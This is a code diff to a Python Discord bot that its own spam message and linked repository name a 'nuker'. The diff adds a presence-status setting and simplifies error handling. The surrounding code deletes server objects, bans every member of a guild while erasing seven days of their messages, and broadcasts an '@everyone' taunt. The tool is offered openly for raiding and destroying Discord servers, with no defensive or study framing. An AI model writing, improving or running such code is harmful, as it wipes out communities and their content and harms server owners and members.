@@ -6,13 +6,30 @@ from asyncio import create_task
 
 
 prefix = '>' 
-token = 'yo token here'
-spamtext = '@everyone @here\n Imagine get nuked by Five bot \n https://github.com/glitch65/Discord-Five-nuker-bot \n XD'
+token = 'ur bot token here'
+spamtext = '@everyone @here\n Imagine get nuked by Five bot \n https://github.com/glitch65/Discord-Five-nuker-bot \n XD '
+ac_name="Five nuker on top"
+ac_type= 0
 
 
 intents = Intents.default()
 intents.members = True
 client = commands.Bot(command_prefix=prefix, help_command=None, intents=intents.all())
+
+
+@client.event
+async def on_ready():
+    if ac_type == 1:
+        await client.change_presence(activity=discord.Game(name=ac_name))
+    elif ac_type == 2:
+        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ac_name))
+    elif ac_type == 3:
+        await client.change_presence(activity=discord.Streaming(name=ac_name, url='https://www.twitch.tv/discord'))
+    elif ac_type == 4:
+        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=ac_name))
+
+
+
 
 async def killobject(obj):
     try: await obj.delete()
@@ -56,14 +73,17 @@ async def bananaa(ctx):
     for member in list(ctx.guild.members):
       try:
         await member.ban(reason="XD", delete_message_days=7)
-        #print(f"Banned {member.display_name}!")
-      except Exception:
-        continue
-       
+      except: pass
+ 
+
+
+
 
 
 
 client.run(token)
+
+
 
 
 
